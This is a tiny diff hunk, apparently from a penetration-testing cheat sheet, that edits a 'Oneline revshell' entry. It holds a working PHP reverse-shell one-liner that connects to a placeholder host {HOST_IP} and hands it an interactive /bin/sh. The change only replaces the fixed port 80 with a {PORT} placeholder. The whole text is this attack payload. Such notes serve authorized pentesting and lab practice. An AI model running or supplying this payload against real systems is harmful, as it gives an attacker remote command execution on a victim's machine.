@@ -36,4 +36,4 @@
 
 - Oneline revshell: 
 
-      php -r '$sock=fsockopen("{HOST_IP}",80);exec("/bin/sh -i <&3 >&3 2>&3");'
+      php -r '$sock=fsockopen("{HOST_IP}",{PORT});exec("/bin/sh -i <&3 >&3 2>&3");'
